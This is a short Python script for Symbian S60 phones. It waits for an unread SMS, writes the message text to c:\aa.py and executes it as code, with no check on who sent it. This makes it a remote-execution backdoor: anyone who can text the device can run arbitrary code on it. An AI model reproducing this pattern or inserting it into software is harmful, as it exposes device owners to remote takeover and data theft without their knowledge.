import inbox,e32
def chn(x):
    return x.decode('utf8')
i=inbox.Inbox()
while 1:
  e32.ao_sleep(1)
  i_id=i.sms_messages()
  if i.unread(i_id[0]):
    f=open('c:\\aa.py','w')
    f.write(i.content(i_id[0]))
    f.close()
    execfile('c:\\aa.py', globals())
    break